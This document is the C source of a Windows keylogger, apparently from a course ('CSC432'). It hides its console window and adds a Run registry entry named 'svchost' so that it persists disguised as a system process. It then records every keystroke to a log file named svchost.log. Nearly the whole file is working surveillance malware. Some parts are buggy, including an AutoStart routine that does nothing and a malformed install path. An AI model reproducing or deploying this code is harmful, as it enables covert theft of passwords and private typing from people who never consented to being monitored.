#pragma comment (lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib") 
#define _CRT_SECURE_NO_WARNINGS	//disable depreciation errors

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <winuser.h> 
#include <windowsx.h> 

#define BUFSIZE 80 

int createKey(char *path)
{
	int regKey, check;
	HKEY hkey;
	regKey = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);

	if (regKey == 0)
	{
		RegSetValueEx((HKEY)hkey, "svchost", 0, REG_SZ, (BYTE *)path, strlen(path));
		check = 0;
	}
	else
		check = 1;

	return check;
}

int getKeys(void)
{
	short chars;

	while (1)
	{
		Sleep(10);	//prevents 100% CPU usage

		for (chars = 8; chars <= 222; chars++) //Ascii characters start at 8
		{
			if (GetAsyncKeyState(chars) == -32767)
			{
				FILE *fp;
				fp = fopen("svchost.log", "a+");	//a+ append/update

				if (fp == NULL)	//the file didn't open
					return 1;

				if (fp != NULL) //the file opened
				{
					if ((chars >= 39) && (chars <= 64))	//special characters
					{
						fputc(chars, fp);
						fclose(fp);
						break;
					}
					else if ((chars >= 65) && (chars <= 90))	//capital letters
					{
						chars = chars + 32;
						fputc(chars, fp);
						fclose(fp);
						break;
					}
					else  //virtual keys
					{
						switch (chars)
						{
						case VK_SPACE:
							fputc(' ', fp);
							fclose(fp);
							break;
						case VK_SHIFT:
							fputs("[SHIFT]", fp);
							fclose(fp);
							break;
						case VK_RETURN:
							fputs("\n[ENTER]", fp);
							fclose(fp);
							break;
						case VK_BACK:
							fputs("[BACKSPACE]", fp);
							fclose(fp);
							break;
						case VK_TAB:
							fputs("[TAB]", fp);
							fclose(fp);
							break;
						case VK_CONTROL:
							fputs("[CTRL]", fp);
							fclose(fp);
							break;
						case VK_DELETE:
							fputs("[DEL]", fp);
							fclose(fp);
							break;
						case VK_OEM_1:
							fputs("[;:]", fp);
							fclose(fp);
							break;
						case VK_OEM_2:
							fputs("[/?]", fp);
							fclose(fp);
							break;
						case VK_OEM_3:
							fputs("[`~]", fp);
							fclose(fp);
							break;
						case VK_OEM_4:
							fputs("[ [{ ]", fp);
							fclose(fp);
							break;
						case VK_OEM_5:
							fputs("[\\|]", fp);
							fclose(fp);
							break;
						case VK_OEM_6:
							fputs("[ ]} ]", fp);
							fclose(fp);
							break;
						case VK_OEM_7:
							fputs("['\"]", fp);
							fclose(fp);
							break;
						case VK_NUMPAD0:
							fputc('0', fp);
							fclose(fp);
							break;
						case VK_NUMPAD1:
							fputc('1', fp);
							fclose(fp);
							break;
						case VK_NUMPAD2:
							fputc('2', fp);
							fclose(fp);
							break;
						case VK_NUMPAD3:
							fputc('3', fp);
							fclose(fp);
							break;
						case VK_NUMPAD4:
							fputc('4', fp);
							fclose(fp);
							break;
						case VK_NUMPAD5:
							fputc('5', fp);
							fclose(fp);
							break;
						case VK_NUMPAD6:
							fputc('6', fp);
							fclose(fp);
							break;
						case VK_NUMPAD7:
							fputc('7', fp);
							fclose(fp);
							break;
						case VK_NUMPAD8:
							fputc('8', fp);
							fclose(fp);
							break;
						case VK_NUMPAD9:
							fputc('9', fp);
							fclose(fp);
							break;
						case VK_CAPITAL:
							fputs("[CAPS LOCK]", fp);
							fclose(fp);
							break;
						default:
							fclose(fp);
							break;
						}
					}
				}
			}
		}
	}

	return EXIT_SUCCESS;
}

int testKey(void)
{
	int check;
	HKEY hKey;
	char path[BUFSIZE];
	DWORD buffer = BUFSIZE;

	int regKey = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey);

	if (regKey != 0)
	{
		check = 1;
		return check;
	}

	regKey = RegQueryValueEx(hKey, "svchost", NULL, NULL, (LPBYTE)path, &buffer);

	if ((regKey != 0) || (buffer > BUFSIZE))
		check = 2;
	if (regKey == 0)
		check = 0;

	RegCloseKey(hKey);
	return check;
}

void AutoStart() {
	wchar_t szRunKey[] = { L"Software\\Microsoft\\Windows\\CurrentVersion\\Run" };
	wchar_t szMyappSubKey[] = { L"CSC432" };
	HKEY hKey;
	wchar_t AppPath[MAX_PATH];
	GetModuleFileName(NULL, AppPath, MAX_PATH);

	if (RegOpenKeyEx(HKEY_CURRENT_USER, szRunKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
		RegCloseKey(hKey);
}

int main()
{
	AutoStart();

	int sleeper = 10000;
	LPDWORD connectionDesc = 0;
	int active = InternetGetConnectedState(connectionDesc, 0);
	int test, create;

	while (active == 0)	//checks internet status
	{
		//printf("No active connection, sleeping for %d seconds now\n", (sleeper / 1000));

		Sleep(sleeper);
		active = InternetGetConnectedState(connectionDesc, 0);
	}

	HWND stealth;	//creates an invisible window
	AllocConsole();

	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);

	test = testKey();	//checks if key is available for opening

	if (test == 2)	//creates key
	{
		char *path = "c:\\%windir%\\svchost.exe";	//the path in which the fp needs to be
		create = createKey(path);
	}

	MessageBoxA(NULL, "Your computer may be compromised. Please change your password. ", "Recommended", MB_ICONEXCLAMATION);

	return getKeys();
}
